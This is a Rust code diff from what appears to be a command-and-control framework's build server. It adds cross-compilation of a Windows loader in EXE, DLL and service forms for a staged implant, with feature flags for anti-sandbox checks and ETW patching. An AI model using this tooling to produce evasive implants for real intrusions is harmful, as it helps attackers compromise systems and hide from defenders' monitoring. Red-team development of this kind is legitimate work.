@@ -25,6 +25,8 @@ use crate::{
     profiles::{Profile, parse_exports_to_string_for_env},
 };
 
+const FULLY_QUAL_PATH_TO_FILE_BUILD: &str = "/app/profiles/tmp";
+
 /// Builds all binaries from a given profile
 ///
 /// On success, this function returns None, otherwise an Error is encoded within a `Value` as a `WyrmResult`
@@ -109,11 +111,185 @@ pub async fn build_all_bins(
     Ok(buf)
 }
 
+async fn write_loader_to_tmp(
+    profile: &Profile,
+    save_path: &PathBuf,
+    implant_profile_name: &str,
+    dll_path: &PathBuf,
+) -> Result<(), String> {
+    let data: NewAgentStaging = match profile.as_staged_agent(implant_profile_name, StageType::All)
+    {
+        WyrmResult::Ok(d) => d,
+        WyrmResult::Err(e) => {
+            let _ = remove_dir(&save_path).await?;
+            let msg = format!("Error constructing a NewAgentStaging. {e:?}");
+            return Err(msg);
+        }
+    };
+
+    //
+    // For every build type, build it - we manually specify the loop size here so as more
+    // build options are added, the loop will need to be increased to accommodate.
+    //
+    for i in 0..3 {
+        let stage_type = match i {
+            0 => StageType::Exe,
+            1 => StageType::Dll,
+            2 => StageType::Svc,
+            _ => unreachable!(),
+        };
+
+        let cmd_build_output = compile_loader(&data, stage_type, dll_path).await;
+        if let Err(e) = cmd_build_output {
+            let msg = &format!("Failed to build loader. {e}");
+            let _ = remove_dir(&save_path).await?;
+            return Err(msg.to_owned());
+        }
+
+        let output = cmd_build_output.unwrap();
+        if !output.status.success() {
+            let msg = &format!(
+                "Failed to build loader. {:#?}",
+                String::from_utf8_lossy(&output.stderr),
+            );
+
+            let _ = remove_dir(&save_path).await?;
+
+            return Err(msg.to_owned());
+        }
+
+        //
+        // Move the built implant to where the operator requested it to be built in
+        //
+        let src_dir = if cfg!(windows) {
+            PathBuf::from(format!("./loader/target/release"))
+        } else {
+            PathBuf::from(format!("./loader/target/x86_64-pc-windows-msvc/release"))
+        };
+
+        let out_dir = Path::new(&save_path);
+        let src = match stage_type {
+            StageType::Dll => src_dir.join("loader.dll"),
+            StageType::Exe => src_dir.join("loader.exe"),
+            StageType::Svc => src_dir.join("loader_svc.exe"),
+            StageType::All => unreachable!(),
+        };
+
+        // Format each output file name as loader_{profile name from toml}
+        let ldr_name_fmt = format!("loader_{}", data.pe_name);
+        let mut dest = out_dir.join(ldr_name_fmt);
+
+        if !(match stage_type {
+            StageType::Dll => dest.add_extension("dll"),
+            StageType::Exe => dest.add_extension("exe"),
+            StageType::Svc => dest.add_extension("svc"),
+            StageType::All => unreachable!(),
+        }) {
+            let msg = format!("Failed to add extension to local file. {dest:?}");
+            let _ = remove_dir(&save_path).await?;
+
+            return Err(msg);
+        };
+
+        // Error check..
+        if let Err(e) = tokio::fs::rename(&src, &dest).await {
+            let cwd = current_dir().expect("could not get cwd");
+            let msg = format!(
+                "Failed to rename built loader - it is *possible* you interrupted the request/page, looking for: {}, to rename to: {}. Cwd: {cwd:?} {e}",
+                src.display(),
+                dest.display()
+            );
+            let _ = remove_dir(&save_path).await?;
+
+            return Err(msg);
+        };
+
+        // Apply relevant transformations to the loader too
+        post_process_pe_on_disk(&dest, &data, stage_type).await;
+    }
+
+    Ok(())
+}
+
+async fn compile_loader(
+    data: &NewAgentStaging,
+    stage_type: StageType,
+    dll_path: &Path,
+) -> Result<std::process::Output, std::io::Error> {
+    if stage_type == StageType::All {
+        return Err(io::Error::other("StageType::All not supported"));
+    }
+
+    let build_as_flags = match stage_type {
+        StageType::Dll => vec!["--lib"],
+        StageType::Exe => vec!["--bin", "loader"],
+        StageType::Svc => vec!["--bin", "loader_svc"],
+        StageType::All => vec![],
+    };
+
+    // Check for any feature flags from the profile
+    let features: Vec<String> = {
+        let mut builder = vec!["--features".to_string()];
+        let mut string_builder = String::new();
+
+        if data.antisandbox_ram {
+            string_builder.push_str("sandbox_mem,");
+        }
+        if data.antisandbox_trig {
+            string_builder.push_str("sandbox_trig,");
+        }
+        if data.patch_etw {
+            string_builder.push_str("patch_etw,");
+        }
+
+        if !string_builder.is_empty() {
+            builder.push(string_builder);
+            builder
+        } else {
+            vec![]
+        }
+    };
+
+    let target = if cfg!(windows) {
+        None
+    } else {
+        Some("x86_64-pc-windows-msvc")
+    };
+
+    let mut cmd = if !cfg!(windows) {
+        tokio::process::Command::new("cargo-xwin")
+    } else {
+        tokio::process::Command::new("cargo")
+    };
+
+    let exports = parse_exports_to_string_for_env(&data.exports);
+
+    cmd.current_dir("./loader")
+        .env("SVC_NAME", data.svc_name.clone())
+        .env("EXPORTS_JMP_WYRM", exports.export_only_jmp_wyrm)
+        .env("EXPORTS_USR_MACHINE_CODE", exports.export_machine_code)
+        .env("EXPORTS_PROXY", exports.export_proxy)
+        .env("DLL_PATH", dll_path)
+        .env("MUTEX", &data.mutex.clone().unwrap_or_default());
+
+    cmd.arg("build");
+
+    if let Some(t) = target {
+        cmd.args(["--target", t]);
+    }
+
+    cmd.arg("--release");
+
+    cmd.args(build_as_flags).args(features);
+
+    cmd.output().await
+}
+
 /// Builds the specified agent as a PE.
 ///
 /// # Important
 /// The PE name passed into this function should NOT include its extension.
-pub async fn build_agent(
+pub async fn compile_agent(
     data: &NewAgentStaging,
     stage_type: StageType,
 ) -> Result<std::process::Output, std::io::Error> {
@@ -212,6 +388,7 @@ pub async fn build_agent(
         .env("EXPORTS_USR_MACHINE_CODE", exports.export_machine_code)
         .env("EXPORTS_PROXY", exports.export_proxy)
         .env("SECURITY_TOKEN", &data.agent_security_token)
+        .env("STAGE_TYPE", format!("{stage_type}"))
         .env("MUTEX", &data.mutex.clone().unwrap_or_default());
 
     cmd.arg("build");
@@ -281,9 +458,9 @@ pub async fn post_process_pe_on_disk(dest: &Path, data: &NewAgentStaging, stage_
     }
 }
 
-pub async fn write_implant_to_tmp_folder(
+pub async fn write_implant_to_tmp_folder<'a>(
     profile: &Profile,
-    save_path: &PathBuf,
+    save_path: &'a PathBuf,
     implant_profile_name: &str,
     state: State<Arc<AppState>>,
 ) -> Result<(), String> {
@@ -313,7 +490,7 @@ pub async fn write_implant_to_tmp_folder(
         };
 
         // Actually try build with cargo
-        let cmd_build_output = build_agent(&data, stage_type).await;
+        let cmd_build_output = compile_agent(&data, stage_type).await;
 
         if let Err(e) = cmd_build_output {
             let msg = &format!("Failed to build agent. {e}");
@@ -377,7 +554,7 @@ pub async fn write_implant_to_tmp_folder(
         if let Err(e) = tokio::fs::rename(&src, &dest).await {
             let cwd = current_dir().expect("could not get cwd");
             let msg = format!(
-                "Failed to rename built agent, looking for: {}, to rename to: {}. Cwd: {cwd:?} {e}",
+                "Failed to rename built agent - it is *possible* you interrupted the request/page, looking for: {}, to rename to: {}. Cwd: {cwd:?} {e}",
                 src.display(),
                 dest.display()
             );
@@ -400,6 +577,23 @@ pub async fn write_implant_to_tmp_folder(
         }
 
         post_process_pe_on_disk(&dest, &data, stage_type).await;
+
+        //
+        // Build the loader for the DLL
+        //
+        if stage_type == StageType::Dll {
+            let p = format!("{}/{}.dll", FULLY_QUAL_PATH_TO_FILE_BUILD, data.pe_name);
+            let dll_path = PathBuf::from(p);
+
+            if !dll_path.exists() {
+                panic!(
+                    "DLL path for the raw binary did not exist. This is not acceptable. Expected path: {}",
+                    dll_path.display()
+                );
+            }
+
+            write_loader_to_tmp(profile, save_path, implant_profile_name, &dll_path).await?;
+        }
     }
 
     Ok(())
